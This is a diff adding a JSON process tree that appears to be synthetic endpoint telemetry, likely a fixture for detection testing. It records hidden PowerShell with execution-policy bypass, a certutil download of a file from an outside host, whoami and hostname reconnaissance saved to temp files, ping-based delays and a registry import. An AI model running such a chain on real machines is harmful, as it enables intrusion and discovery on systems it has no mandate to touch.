@@ -1,0 +1,150 @@
+{
+  "pid": 182131,
+  "ppid": 0,
+  "name": "services.exe",
+  "command": "services.exe -k Schedule",
+  "children": [
+    {
+      "pid": 182132,
+      "ppid": 182131,
+      "name": "powershell.exe",
+      "command": "powershell.exe -WindowStyle Minimized -ExecutionPolicy Bypass -Command \"Get-WinEvent -LogName System -MaxEvents 100 | Out-File 'C:\\Users\\karthik.bose\\AppData\\Local\\Temp\\inv_3d4c3ee9.txt'\"",
+      "children": [
+        {
+          "pid": 182138,
+          "ppid": 182132,
+          "name": "powershell.exe",
+          "command": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"C:\\ProgramData\\Litware\\Profile\\TrustRefresh_730f20ee.ps1\" -Host \"WS-136\" -Mode Full",
+          "children": [
+            {
+              "pid": 182144,
+              "ppid": 182138,
+              "name": "powershell.exe",
+              "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 12\"",
+              "children": [
+                {
+                  "pid": 182151,
+                  "ppid": 182144,
+                  "name": "certutil.exe",
+                  "command": "certutil.exe -urlcache -split -f \"http://support.wingtipsoft.com/tools/support.cab\" \"C:\\Users\\Public\\cache.cer\"",
+                  "children": [
+                    {
+                      "pid": 182153,
+                      "ppid": 182151,
+                      "name": "whoami.exe",
+                      "command": "whoami.exe /groups",
+                      "children": [
+                        {
+                          "pid": 182154,
+                          "ppid": 182153,
+                          "name": "powershell.exe",
+                          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 24\"",
+                          "children": [
+                            {
+                              "pid": 182155,
+                              "ppid": 182154,
+                              "name": "hostname.exe",
+                              "command": "hostname.exe > \"C:\\Users\\karthik.bose\\AppData\\Local\\Temp\\host_19918693.txt\"",
+                              "children": [
+                                {
+                                  "pid": 182162,
+                                  "ppid": 182155,
+                                  "name": "whoami.exe",
+                                  "command": "whoami.exe /priv > \"C:\\Users\\karthik.bose\\AppData\\Local\\Temp\\who_9f34e582.txt\"",
+                                  "children": [
+                                    {
+                                      "pid": 182167,
+                                      "ppid": 182162,
+                                      "name": "timeout.exe",
+                                      "command": "timeout.exe /t 10 /nobreak",
+                                      "children": []
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    },
+                    {
+                      "pid": 182173,
+                      "ppid": 182151,
+                      "name": "cmd.exe",
+                      "command": "cmd.exe /c \"hostname.exe\"",
+                      "children": [
+                        {
+                          "pid": 182175,
+                          "ppid": 182173,
+                          "name": "whoami.exe",
+                          "command": "whoami.exe /all > \"C:\\Users\\karthik.bose\\AppData\\Local\\Temp\\who_bb9f11f6.txt\"",
+                          "children": [
+                            {
+                              "pid": 182181,
+                              "ppid": 182175,
+                              "name": "certutil.exe",
+                              "command": "certutil.exe -verify \"C:\\Users\\Public\\agent_signing.cer\"",
+                              "children": [
+                                {
+                                  "pid": 182188,
+                                  "ppid": 182181,
+                                  "name": "ping.exe",
+                                  "command": "ping.exe -n 23 127.0.0.1 > nul",
+                                  "children": [
+                                    {
+                                      "pid": 182190,
+                                      "ppid": 182188,
+                                      "name": "ping.exe",
+                                      "command": "ping.exe -n 14 127.0.0.1 > nul",
+                                      "children": [
+                                        {
+                                          "pid": 182197,
+                                          "ppid": 182190,
+                                          "name": "hostname.exe",
+                                          "command": "hostname.exe",
+                                          "children": [
+                                            {
+                                              "pid": 182202,
+                                              "ppid": 182197,
+                                              "name": "reg.exe",
+                                              "command": "reg.exe import \"C:\\Build\\obj\\5c865645\\Patch_778edd16.reg\"",
+                                              "children": [
+                                                {
+                                                  "pid": 182208,
+                                                  "ppid": 182202,
+                                                  "name": "hostname.exe",
+                                                  "command": "hostname.exe > \"C:\\Users\\karthik.bose\\AppData\\Local\\Temp\\host_9d34697f.txt\"",
+                                                  "children": [
+                                                    {
+                                                      "pid": 182212,
+                                                      "ppid": 182208,
+                                                      "name": "ping.exe",
+                                                      "command": "ping.exe -n 11 127.0.0.1 > nul",
+                                                      "children": []
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
